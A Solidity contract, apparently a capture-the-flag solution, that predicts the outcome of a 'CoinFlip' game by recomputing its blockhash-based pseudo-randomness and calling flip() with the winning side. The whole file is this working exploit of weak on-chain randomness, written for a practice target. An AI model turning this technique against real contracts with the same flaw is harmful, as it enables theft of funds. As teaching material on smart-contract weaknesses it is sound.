// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./coinflip.sol";

/**
 * @title Hack CoinFlip
 * @author Holly Grimm
 * @notice Calculates correct coin flip based on block number and FACTOR.
 */
contract HackCoinFlip {
    using SafeMath for uint256;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    // @dev Original CoinFlip Contract
    CoinFlip private _coinFlipContract;

    // @dev Holds the number of wins
    uint256 private wins = 0;

    constructor(address coinFlipContractAddress) public {
        _coinFlipContract = CoinFlip(coinFlipContractAddress);
    }

    event WinsUpdated(uint256 value);

    /**
     * @notice Calculates flip value based on block number and calls CoinFlip
     */
    function hackFlip() public {
        //Calculate correct flip value
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = uint256(uint256(blockValue).div(FACTOR));
        bool side = coinFlip == 1 ? true : false;

        //Call CoinFlip Contract
        _coinFlipContract.flip(side);

        wins = _coinFlipContract.consecutiveWins();

        emit WinsUpdated(wins);
    }

    /**
     * @notice Gets the wins value
     */
    function getWins() public view returns (uint256) {
        return wins;
    }
}
